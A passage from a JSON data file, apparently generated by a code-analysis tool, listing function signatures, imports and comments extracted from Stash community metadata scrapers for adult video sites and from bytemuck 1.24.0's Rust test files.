          "def fetch_post(cls, post_id: str) -> Union[Dict[str, Any], None]:\n\"\"\"\nFetches a post from the FetishKitsch website.\n\nParameters\n----------\npost_id : str\nThe ID of the post to fetch.\n\nReturns",
          "def fetch_thumbnail(cls, thumbnail_url: str) -> Union[str, None]:\n\"\"\"\nFetches the thumbnail for a post from the FetishKitsch website.\n\nParameters\n----------\nthumbnail_url : str\nThe URL of the thumbnail to fetch.\n\nReturns",
          "def map_performer(cls, performer: str) -> ScrapedPerformer:\n\"\"\"\nMaps a raw performer info to a ScrapedPerformer.\n\nParameters\n----------\nperformer : str\nThe raw performer info to map.\n\nReturns",
          "def map_tag(cls, tag: str) -> ScrapedTag:\n\"\"\"\nMaps a raw tag to a ScrapedTag.\n\nParameters\n----------\ntag : str\nThe raw tag to map.\n\nReturns",
          "def scrape_build_id(cls) -> Union[str, None]:\n\"\"\"\nFetches the buildId from the next.js website.\n\nReturns\n-------\nUnion[str, None]\nThe buildId if it was found, None otherwise.\n\"\"\"",
          "def scrape_scene(cls, url: str) -> Union[ScrapedScene, None]:\n\"\"\"\nScrapes a scene from FetishKitsch.com.\n\nParameters\n----------\nurl : str\nThe URL of the scene to scrape.\n\nReturns"
        ],
        "class_defs": [
          "class FetishKitsch:"
        ],
        "imports": [
          "import base64",
          "import json",
          "import sys",
          "from datetime import datetime",
          "from typing import Union, Any, Dict, List",
          "from urllib.parse import urljoin, urlparse",
          "from py_common import log",
          "from py_common.types import ScrapedPerformer, ScrapedScene, ScrapedTag",
          "import requests",
          "from bs4 import BeautifulSoup"
        ],
        "comments": [
          "# Last Updated July 08, 2024"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FileMetadata/FileMetadata.py",
        "docstrings": [],
        "function_defs": [
          "def parse_url(comment):",
          "def scrape_file(path):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "import subprocess as sp",
          "from datetime import datetime",
          "from urllib.parse import urlparse",
          "from py_common import log"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Filename/Filename.py",
        "docstrings": [],
        "function_defs": [
          "def title_from_filename(js):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "import sys",
          "from py_common import graphql",
          "from py_common import log"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Fit18/Fit18.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, name: str):",
          "def isValidURL(self, url: str):",
          "def getScene(self, url: str):",
          "def getImage(self, talentId: str):",
          "def callGraphQL(self, query: dict):",
          "def parse_scene(self, response):"
        ],
        "class_defs": [
          "class Site:"
        ],
        "imports": [
          "import json",
          "import os",
          "import re",
          "import sys",
          "import urllib.parse",
          "from urllib.parse import urlparse",
          "import requests",
          "import py_common.log as log"
        ],
        "comments": [
          "# to import from a parent directory we need to add that directory to the system path",
          "# Remove double space",
          "# There are no 2 performers in a scene so useless to deal with lists",
          "# performers = [x[\"talent\"].get(\"name\") for x in scene_info[\"talent\"]]",
          "# Performer ID for getting the image",
          "#log.debug(f\"{json.dumps(s)}\")"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/GangBangCreampie/GangBangCreampie.py",
        "docstrings": [],
        "function_defs": [
          "def determine_studio(api_object: dict[str, Any]) -> str | None:\n\"\"\"\nDetermine studio name from API object properties to use instead of the\n`studio_name` property scraped by default\n\"\"\"",
          "def postprocess_scene(scene: ScrapedScene, api_scene: dict[str, Any]) -> ScrapedScene:\n\"\"\"\nApplies post-processing to the scene\n\"\"\"",
          "def postprocess_movie(movie: ScrapedMovie, api_movie: dict[str, Any]) -> ScrapedMovie:\n\"\"\"\nApplies post-processing to the movie\n\"\"\"",
          "def postprocess_gallery(gallery: ScrapedGallery, api_gallery: dict[str, Any]) -> ScrapedGallery:\n\"\"\"\nApplies post-processing to the gallery\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from urllib.parse import urlparse",
          "from AlgoliaAPI.AlgoliaAPI import (",
          "from py_common import log",
          "from py_common.types import ScrapedGallery, ScrapedMovie, ScrapedScene",
          "from py_common.util import scraper_args"
        ],
        "comments": [
          "# steps through api_scene[\"availableOnSite\"], and picks the first match",
          "# most scenes have the studio name as the main channel name"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/GayWire/GayWire.py",
        "docstrings": [],
        "function_defs": [
          "def redirect(url: str) -> str:",
          "def gaywire(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from requests import head",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import replace_all, replace_at",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# API returns Gay Wire substudios as bangbros.com",
          "# Rename certain studios according to the map"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/GenderXFilms/GenderXFilms.py",
        "docstrings": [],
        "function_defs": [
          "def determine_studio(api_object: dict[str, Any]) -> str | None:\n\"\"\"\nDetermine studio name from API object properties to use instead of the\n`studio_name` property scraped by default\n\"\"\"",
          "def postprocess_scene(scene: ScrapedScene, api_scene: dict[str, Any]) -> ScrapedScene:\n\"\"\"\nApplies post-processing to the scene\n\"\"\"",
          "def postprocess_movie(movie: ScrapedMovie, api_movie: dict[str, Any]) -> ScrapedMovie:\n\"\"\"\nApplies post-processing to the movie\n\"\"\"",
          "def postprocess_gallery(gallery: ScrapedGallery, api_gallery: dict[str, Any]) -> ScrapedGallery:\n\"\"\"\nApplies post-processing to the gallery\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from AlgoliaAPI.AlgoliaAPI import (",
          "from py_common import log",
          "from py_common.types import ScrapedScene",
          "from py_common.util import scraper_args"
        ],
        "comments": [
          "# steps through api_scene[\"availableOnSite\"], and picks the first match",
          "# most scenes have the studio name as the main channel name"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/GEVI/GEVI.py",
        "docstrings": [],
        "function_defs": [
          "def abs_url(url: str) -> str:",
          "def parse_name(name: str) -> tuple[str, str | None]:",
          "def name_with_url(link: Tag) -> dict:",
          "def from_table(soup: Tag, key: str) -> str | None:",
          "def scene_from_url(url: str) -> ScrapedScene | None:",
          "def scene_from_fragment(args: dict) -> ScrapedScene | None:",
          "def performer_from_url(url: str) -> ScrapedPerformer | None:",
          "def performer_from_fragment(args: dict) -> ScrapedPerformer | None:",
          "def performer_search(name: str) -> list[ScrapedPerformer]:",
          "def movie_from_url(url: str) -> ScrapedMovie | None:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "from urllib.parse import urlparse, urlencode",
          "from bs4 import BeautifulSoup, Tag",
          "import cloudscraper",
          "from py_common.config import get_config",
          "from py_common.types import ScrapedPerformer, ScrapedScene, ScrapedMovie, ScrapedStudio",
          "from py_common.util import scraper_args, guess_nationality",
          "import py_common.log as log"
        ],
        "comments": [
          "# false: \"John Doe\"",
          "# true:  \"John Doe (II)\"",
          "# For names",
          "# For aliases",
          "# For performer/studio links from episode/movie pages",
          "# Not really a HTML table, but the layout is consistent",
          "# GEVI tracks skin color so there's no way to really know ethnicity",
          "# Unfortunately GEVI only tracks birth years, not full dates",
          "# Unfortunately GEVI only tracks release years, not full dates"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Got2Pee/got2pee_scraper.py",
        "docstrings": [],
        "function_defs": [
          "def get_page_content(url):\n\"\"\"Fetch and parse HTML content from a given URL.\"\"\"\nheaders = {\n\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"\n}\nlog.debug(f\"Fetching URL: {url}\")\ntry:\nresponse = requests.get(url, headers=headers, timeout=10)\nresponse.raise_for_status()\nreturn html.fromstring(response.content)",
          "def format_date(date_str):\n\"\"\"Convert date from 'Oct 9, 2017' to 'YYYY-MM-DD' format.\"\"\"\ntry:\nreturn datetime.strptime(date_str, \"%b %d, %Y\").strftime(\"%Y-%m-%d\")\nexcept ValueError:\nreturn None  # Return None if the date can't be parsed\n\n\ndef scrape_video_data(main_url):\n\"\"\"Extract title, image, details, tags, studio, and date for the given video URL.\"\"\"",
          "def scrape_video_data(main_url):\n\"\"\"Extract title, image, details, tags, studio, and date for the given video URL.\"\"\"\ntree = get_page_content(main_url)\nif tree is None:\nreturn {}\n\nscene: dict = {\n\"studio\": {\"name\": \"Got2Pee\", \"url\": \"https://got2pee.com\"},\n}\n",
          "def scrape_video_date(main_url):\n\"\"\"Find the video URL in related videos and extract the corresponding date.\"\"\"\ntree = get_page_content(main_url)\nif tree is None:\nreturn None\n\nrelated_video_urls = tree.xpath(\n\"/html/body/div[3]/div/div[2]/div[12]/section/div/div[1]/div/div/div[1]/a/@href\"\n)\nrelated_video_urls = ["
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from datetime import datetime",
          "from py_common.deps import ensure_requirements",
          "import py_common.log as log",
          "import requests  # noqa: E402",
          "from lxml import html  # noqa: E402"
        ],
        "comments": [
          "# Remove hashtag from tags",
          "# Dates are only available from from the list of related videos"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/IAFD/IAFD.py",
        "docstrings": [],
        "function_defs": [
          "def maybe(",
          "def cleandict(d: dict):",
          "def map_gender(gender: str):",
          "def map_haircolor(haircolor: str):",
          "def clean_date(date: str) -> str | None:",
          "def clean_alias(alias: str) -> str | None:",
          "def base64_image(url) -> str:",
          "def performer_haircolor(tree):",
          "def performer_weight(tree):",
          "def performer_height(tree):",
          "def performer_country(tree):",
          "def performer_ethnicity(tree):",
          "def performer_deathdate(tree):",
          "def performer_birthdate(tree):",
          "def performer_instagram(tree):",
          "def performer_twitter(tree):",
          "def performer_url(tree):",
          "def performer_gender_map(tree):",
          "def performer_name(tree):",
          "def performer_piercings(tree):",
          "def performer_tattoos(tree):",
          "def performer_eyecolor(tree):",
          "def performer_aliases(tree):",
          "def performer_careerlength(tree):",
          "def performer_measurements(tree):",
          "def scene_director(tree):",
          "def scene_studio(tree):",
          "def scene_details(tree):",
          "def scene_date(tree):",
          "def scene_title(tree):",
          "def movie_studio(tree):",
          "def movie_date(tree):",
          "def movie_duration(tree):",
          "def movie_synopsis(tree):",
          "def movie_director(tree):",
          "def movie_title(tree):",
          "def video_url(tree):",
          "def scrape(url: str, retries=0):",
          "def performer_query(query):",
          "def performer_from_tree(tree):",
          "def scene_from_tree(tree):",
          "def movie_from_tree(tree):",
          "def scene_from_url(url: str):",
          "def performer_from_url(url: str):",
          "def movie_from_url(url: str):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import random",
          "import re",
          "import requests",
          "import sys",
          "import time",
          "from typing import Iterable, Callable, TypeVar",
          "from datetime import datetime",
          "from py_common.util import guess_nationality, scraper_args",
          "import py_common.log as log",
          "from py_common.deps import ensure_requirements",
          "import cloudscraper  # noqa: E402",
          "from lxml import html  # noqa: E402",
          "import base64"
        ],
        "comments": [
          "# Aliases like \"X or Y or Z\" are indeterminate",
          "# and should not be included",
          "# We do not want studio disambiguation: \"X (studio.com)\" -> \"X\"",
          "# If there's no release date we will use the year from the title for an approximate date",
          "# If there's no release date we will use the year from the title for an approximate date",
          "# Convert duration from minutes to seconds, but keep it a string because that's what stash expects",
          "# Only create a single scraper: this saves time when scraping multiple pages",
          "# because it doesn't need to get past Cloudflare each time"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/IFeelMyself/IFeelMyself.py",
        "docstrings": [],
        "function_defs": [
          "def readJSONInput():",
          "def extract_SceneInfo(table,cover_url=None):",
          "def debugPrint(t):",
          "def scrapeScene(filename,date,url):",
          "def extract_PerformerInfo(table,browser,cover_url=None):",
          "def queryPerformer(perfname):",
          "def scrapePerformer(artist_id):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "from datetime import datetime",
          "import unicodedata",
          "from mechanicalsoup import StatefulBrowser",
          "from requests.cookies import create_cookie"
        ],
        "comments": [
          "# UNLESS logged in(and probably with an active subscription) scenes with certain tags(menstruation, pee) are hidden and can not be found by scraper.",
          "# Also performer scraper will not be able to get country and details without being logged in.",
          "# set value for ifeel_auth cookie here, may change and need to be renewed periodically.",
          "# if no account available leave value empty and scraper won't find some videos and country and details fields will be missing from performer scrapes.",
          "#use the image url to extract the metadeta",
          "# Extract data from this single result",
          "#Obtaining and counting the results. Ideally you only have a single result",
          "#Obtaining and counting the results. Ideally you only have a single result",
          "# often performer names use a underscore instead of a space, so replace spaces and try again",
          "#Obtaining and counting the results. Ideally you only have a single result",
          "# read the input"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Iwara/Iwara.py",
        "docstrings": [],
        "function_defs": [
          "def auth_token(username: str, password: str):",
          "def api_request(query):",
          "def to_scraped_scene(json_from_api: dict):",
          "def get_video_details(video_id):",
          "def scene_by_url(url):",
          "def scene_by_filename(file):",
          "def scene_search(query):"
        ],
        "class_defs": [],
        "imports": [
          "import re",
          "import json",
          "import sys",
          "from datetime import datetime",
          "import py_common.log as log",
          "from py_common.cache import cache_to_disk",
          "from py_common.util import dig, scraper_args",
          "from py_common.config import get_config",
          "from py_common.deps import ensure_requirements",
          "import cloudscraper  # noqa: E402"
        ],
        "comments": [
          "# Some videos have custom thumbnails",
          "# Example: https://www.iwara.tv/video/J7W7n4VdKtohQ7/",
          "# Normal thumbnails must have their index padded to two digits: 1 -> thumbnail-01.jpg",
          "# Example: https://www.iwara.tv/video/2DORyCe5fVqXz6/",
          "# Filename must contain video ID in brackets",
          "# Example: Robin - Queencard [2DORyCe5fVqXz6].mp4"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@cache_to_disk(ttl=60 * 60 * 24)"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/JacquieEtMichelTV/JacquieEtMichelTV.py",
        "docstrings": [],
        "function_defs": [
          "def scene_from_url(url: str) -> ScrapedScene | None:"
        ],
        "class_defs": [],
        "imports": [
          "import base64",
          "from datetime import datetime as dt",
          "from html import unescape",
          "import json",
          "import sys",
          "from py_common import log",
          "from py_common.types import ScrapedScene",
          "from py_common.util import scraper_args, dig",
          "from py_common.deps import ensure_requirements",
          "import cloudscraper  # noqa: E402",
          "from lxml import html  # noqa: E402"
        ],
        "comments": [
          "# Performers are also listed in the data-zeder-actor-* attributes",
          "# but they do not have accented characters and are not capitalized"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 4,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0",
    "name": "bytemuck-1.24.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/wrapper_forgets.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [
          "struct Wrap(Box<u32>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use bytemuck::TransparentWrapper;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/derive.rs",
        "function_defs": [
          "fn test_generic<T>(x: T) -> TransparentWithGeneric<T> {",
          "fn test_generic_with_zst<T>(x: T) -> TransparentWithGenericAndZeroSized<T> {"
        ],
        "struct_defs": [
          "struct Test {",
          "struct TransparentSingle {",
          "struct TransparentWithZeroSized {",
          "struct TransparentWithGeneric<T: ?Sized> {",
          "struct TransparentWithGenericAndZeroSized<T: ?Sized> {",
          "struct TransparentUnsized {",
          "struct TransparentUnsizedWithZeroSized {",
          "struct TransparentUnsizedWithGenericZeroSizeds<T: ?Sized, U: ?Sized> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use bytemuck::{ByteEq, ByteHash, Pod, TransparentWrapper, Zeroable};",
          "use std::marker::PhantomData;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Copy, Clone, Pod, Zeroable, ByteEq, ByteHash)]",
          "#[derive(TransparentWrapper)]",
          "#[derive(TransparentWrapper)]",
          "#[derive(TransparentWrapper)]",
          "#[derive(TransparentWrapper)]",
          "#[derive(TransparentWrapper)]",
          "#[derive(TransparentWrapper)]",
          "#[derive(TransparentWrapper)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/array_tests.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/transparent.rs",
        "function_defs": [
          "fn test_transparent_wrapper() {",
          "fn eq(&self, &other: &u8) -> bool {",
          "fn eq(&self, &other: &u8) -> bool {"
        ],
        "struct_defs": [
          "struct Foreign(u8);",
          "struct Wrapper(Foreign);"
        ],
        "impl_blocks": [
          "impl PartialEq<u8> for Foreign {",
          "impl PartialEq<u8> for Wrapper {"
        ],
        "uses": [
          "use bytemuck::TransparentWrapper;",
          "use bytemuck::allocation::TransparentWrapperAlloc;",
          "use std::rc::Rc;",
          "use std::sync::Arc;"
        ],
        "macros": [
          "assert_eq!(b, [0, 0]);",
          "assert_eq!(c, [0, 0]);",
          "assert_eq!(&*e, &0);",
          "assert_eq!(&*f, &0);",
          "assert_eq!(&*h, &0);",
          "assert_eq!(&*i, &0);",
          "assert_eq!(&*k, &0);",
          "assert_eq!(&*l, &0);"
        ],
        "derives": [
          "#[derive(Debug, Copy, Clone, Default)]",
          "#[derive(Debug, Copy, Clone)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/checked_tests.rs",
        "function_defs": [
          "fn test_try_cast_slice() {",
          "fn test_try_cast_slice_mut() {",
          "fn test_types() {",
          "fn test_try_pod_read_unaligned() {",
          "fn test_try_from_bytes() {",
          "fn test_try_from_bytes_mut() {",
          "fn test_from_bytes() {",
          "fn test_from_bytes_mut() {",
          "fn test_panics() {",
          "fn test_char() {",
          "fn test_bool() {",
          "fn test_all_nonzero() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::{",
          "use bytemuck::{checked::CheckedCastError, *};",
          "use core::num::*;"
        ],
        "macros": [
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(core::ptr::eq(",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(",
          "concat!(\"should have panicked: `\", stringify!($ex), \"`\")",
          "should_panic!(checked::cast::<u32, NonZeroU32>(0));",
          "should_panic!(checked::cast_ref::<u32, NonZeroU32>(&0));",
          "should_panic!(checked::cast_mut::<u32, NonZeroU32>(&mut 0));",
          "should_panic!(checked::cast_slice::<u8, NonZeroU32>(&[1u8, 2u8]));",
          "should_panic!(checked::cast_slice_mut::<u8, NonZeroU32>(&mut [1u8, 2u8]));",
          "should_panic!(checked::from_bytes::<NonZeroU32>(&[1u8, 2]));",
          "should_panic!(checked::from_bytes::<NonZeroU32>(&[1u8, 2, 3, 4, 5]));",
          "should_panic!(checked::from_bytes_mut::<NonZeroU32>(&mut [1u8, 2]));",
          "should_panic!(checked::from_bytes_mut::<NonZeroU32>(&mut [1u8, 2, 3, 4, 5]));",
          "should_panic!(checked::from_bytes::<NonZeroU32>(aligned_bytes));",
          "should_panic!(checked::from_bytes::<NonZeroU32>(&aligned_bytes[1..5]));",
          "should_panic!(checked::pod_read_unaligned::<NonZeroU32>(",
          "assert_eq!(checked::try_cast::<u32, char>(0), Ok('\\0'));",
          "assert_eq!(checked::try_cast::<u32, char>(0xd7ff), Ok('\\u{d7ff}'));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(checked::try_cast::<u32, char>(0xe000), Ok('\\u{e000}'));",
          "assert_eq!(checked::try_cast::<u32, char>(0x10ffff), Ok('\\u{10ffff}'));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(checked::try_cast::<u8, bool>(0), Ok(false));",
          "assert_eq!(checked::try_cast::<u8, bool>(1), Ok(true));",
          "assert_eq!(",
          "assert_eq!(checked::try_from_bytes::<bool>(&[1]), Ok(&true));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "test_nonzero!(NonZeroU8: u8);",
          "test_nonzero!(NonZeroI8: i8);",
          "test_nonzero!(NonZeroU16: u16);",
          "test_nonzero!(NonZeroI16: i16);",
          "test_nonzero!(NonZeroU32: u32);",
          "test_nonzero!(NonZeroI32: i32);",
          "test_nonzero!(NonZeroU64: u64);",
          "test_nonzero!(NonZeroI64: i64);",
          "test_nonzero!(NonZeroU128: u128);",
          "test_nonzero!(NonZeroI128: i128);",
          "test_nonzero!(NonZeroUsize: usize);",
          "test_nonzero!(NonZeroIsize: isize);"
        ],
        "derives": [],
        "error_handling": 19
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/cast_slice_tests.rs",
        "function_defs": [
          "fn test_try_cast_slice() {",
          "fn test_try_cast_slice_mut() {",
          "fn test_types() {",
          "fn test_bytes_of() {",
          "fn test_try_from_bytes() {",
          "fn test_try_from_bytes_mut() {",
          "fn test_from_bytes() {",
          "fn test_from_bytes_mut() {",
          "fn test_panics() {",
          "fn test_zsts() {",
          "fn test_boxed_slices() {",
          "fn test_rc_slices() {",
          "fn test_arc_slices() {",
          "fn box_bytes_zst() {"
        ],
        "struct_defs": [
          "struct MyZst;"
        ],
        "impl_blocks": [],
        "uses": [
          "use core::mem::size_of;",
          "use bytemuck::*;",
          "use std::rc::Rc;",
          "use std::sync::Arc;"
        ],
        "macros": [
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(u32_len * size_of::<u32>(), the_bytes_len * size_of::<u8>());",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(bytes_of(&0xaabbccdd_u32), &0xaabbccdd_u32.to_ne_bytes());",
          "assert_eq!(",
          "assert_eq!(bytes_of(&a).as_ptr() as usize, a_addr);",
          "assert_eq!(bytes_of_mut(&mut a).as_ptr() as usize, a_addr);",
          "assert_eq!(try_from_bytes::<u32>(&bytes[..4]), Ok(&u32s[0]));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(try_from_bytes_mut::<u32>(&mut bytes[..4]), Ok(&mut abcd));",
          "assert_eq!(try_from_bytes_mut::<u32>(&mut bytes[..4]), Ok(&mut abcd));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(from_bytes::<u32>(aligned_bytes), &abcd);",
          "assert!(core::ptr::eq(from_bytes(aligned_bytes), &abcd));",
          "assert_eq!(*from_bytes_mut::<u32>(aligned_bytes), 0xaabbccdd_u32);",
          "assert_eq!(",
          "assert!(",
          "concat!(\"should have panicked: `\", stringify!($ex), \"`\")",
          "should_panic!(cast_slice::<u8, u32>(&[1u8, 2u8]));",
          "should_panic!(cast_slice_mut::<u8, u32>(&mut [1u8, 2u8]));",
          "should_panic!(from_bytes::<u32>(&[1u8, 2]));",
          "should_panic!(from_bytes::<u32>(&[1u8, 2, 3, 4, 5]));",
          "should_panic!(from_bytes_mut::<u32>(&mut [1u8, 2]));",
          "should_panic!(from_bytes_mut::<u32>(&mut [1u8, 2, 3, 4, 5]));",
          "should_panic!(from_bytes::<u32>(&aligned_bytes[1..5]));",
          "assert_eq!(42, cast_slice::<(), MyZst>(&[(); 42]).len());",
          "assert_eq!(42, cast_slice_mut::<(), MyZst>(&mut [(); 42]).len());",
          "assert_eq!(0, cast_slice::<(), u8>(&[(); 42]).len());",
          "assert_eq!(0, cast_slice_mut::<(), u8>(&mut [(); 42]).len());",
          "assert_eq!(0, cast_slice::<u8, ()>(&[]).len());",
          "assert_eq!(0, cast_slice_mut::<u8, ()>(&mut []).len());",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(&*boxed_i8_slice, [0, 1, -1, i8::MAX]);",
          "assert_eq!(error, PodCastError::AlignmentMismatch);",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert!(empty.is_empty());",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert!(empty.is_empty());",
          "assert!(empty.is_empty());",
          "assert_eq!(&*rc_i8_slice, [0, 1, -1, i8::MAX]);",
          "assert_eq!(error, PodCastError::AlignmentMismatch);",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert!(empty.is_empty());",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert!(empty.is_empty());",
          "assert!(empty.is_empty());",
          "assert_eq!(&*arc_i8_slice, [0, 1, -1, i8::MAX]);",
          "assert_eq!(error, PodCastError::AlignmentMismatch);",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert!(empty.is_empty());",
          "assert_eq!(error, PodCastError::OutputSliceWouldHaveSlop);",
          "assert!(empty.is_empty());",
          "assert!(empty.is_empty());",
          "assert_eq!(res.unwrap_err().0, PodCastError::OutputSliceWouldHaveSlop);"
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/doc_tests.rs",
        "function_defs": [
          "fn test_transparent_slice() {",
          "fn test_transparent_basic() {",
          "fn test_contiguous_doc() {",
          "fn test_offsetof_vertex() {",
          "fn test_offsetof_nonpod() {"
        ],
        "struct_defs": [
          "struct Slice<T>([T]);",
          "struct SomeStruct(u32);",
          "struct MyWrapper(SomeStruct);",
          "struct Vertex {",
          "struct Foo {"
        ],
        "impl_blocks": [],
        "uses": [
          "use bytemuck::*;"
        ],
        "macros": [
          "assert_eq!(&s.0, &[1, 2, 3]);",
          "assert_eq!(Foo::from_integer(3).unwrap(), Foo::D);",
          "assert_eq!(Foo::from_integer(8), None);",
          "assert_eq!(Foo::C.into_integer(), 2);",
          "assert_eq!(Foo::B.into_integer(), Foo::B as u8);",
          "let pos = offset_of!(Zeroable::zeroed(), Vertex, pos);",
          "let uv = offset_of!(Zeroable::zeroed(), Vertex, uv);",
          "let color = offset_of!(Zeroable::zeroed(), Vertex, color);",
          "assert_eq!(pos, 0);",
          "assert_eq!(uv, 8);",
          "assert_eq!(color, 12);",
          "let a_offset = offset_of!(Default::default(), Foo, a);",
          "let b_offset = offset_of!(Default::default(), Foo, b);",
          "let c_offset = offset_of!(Default::default(), Foo, c);",
          "assert_ne!(a_offset, b_offset);",
